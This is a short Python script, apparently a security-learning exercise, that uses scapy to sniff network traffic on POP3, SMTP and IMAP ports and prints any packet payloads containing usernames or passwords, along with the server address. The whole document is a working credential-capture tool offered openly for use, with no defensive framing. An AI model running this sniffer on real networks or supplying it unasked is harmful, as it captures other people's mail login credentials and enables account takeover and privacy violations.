'''
	Made By Sai Harsha Kottapalli
	Tested on python3
	About	: 	Sniff mail Credentials
	Use	 	:	simple sniffer,captures POP3,SMTP and IMAP credentials.
'''

from scapy.all import *

#for each captured packet
def callback(packet):
	if packet[TCP].payload:

		mail_packet = str(packet[TCP].payload)

		if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
			print("[*]server: {0}".format(packet[IP].dst))
			print("[*]{0}".format(packet[TCP].payload))

def main():
	#110(POP3),25(SMTP) and 143(IMAP)
	# store = 0 to avoid keeping packets in memory
	sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=callback, store=0)

if __name__ == "__main__":
	main()